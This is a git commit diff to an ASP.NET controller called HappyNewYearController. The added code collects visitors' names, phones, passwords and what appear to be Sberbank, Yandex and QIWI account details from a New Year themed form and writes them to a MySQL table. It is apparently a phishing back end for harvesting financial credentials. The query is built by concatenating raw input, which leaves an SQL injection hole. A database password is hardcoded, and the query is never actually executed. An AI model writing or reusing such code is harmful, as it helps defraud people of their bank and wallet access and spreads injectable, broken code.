1e3fe1d870878fbb177ac6ab68c8a387bc4e225d
Oleg Mursalov <olofovich@mail.ru>
2021-01-04 17:30:53 +0300

    новый сайтик пестик

--- PrettyGoods/Controllers/HappyNewYearController.cs
+++ PrettyGoods/Controllers/HappyNewYearController.cs
@@ -1,4 +1,6 @@
-﻿using System.Web.Mvc;
+﻿using System.Text;
+using System.Web.Mvc;
+using MySql.Data.MySqlClient;
 
 namespace PrettyGoods.Controllers
 {
@@ -25,7 +27,23 @@ namespace PrettyGoods.Controllers
                 return View("Main");
             }
 
+            InsertPersonToMySqlDB(name, phone, password, sber, yand, qiwi, comment);
+
             return View("Yes");
+        }
+
+        private void InsertPersonToMySqlDB(string name, string phone, string password, string sber, string yand, string qiwi, string comment)
+        {
+            string Connect = "Database=u1109918_default;Data Source=localhost:3306;User Id=u1109_918default;Password=VnsPL4XSa5";
+            using (var myConnection = new MySqlConnection(Connect))
+            {
+                myConnection.Open();
+                var sb = new StringBuilder();
+                sb.AppendLine("INSERT INTO `persons`(`name`, `phone`, `password`, `sber`, `yand`, `qiwi`, `comment`)");
+                sb.AppendLine(@"VALUES('" + name + "','" + phone + "','" + password + "','" + sber + "','" + yand + "','" + qiwi + "','" + comment + "')");
+                var myCommand = new MySqlCommand(sb.ToString(), myConnection);
+                myConnection.Close();
+            }
         }
     }
 }
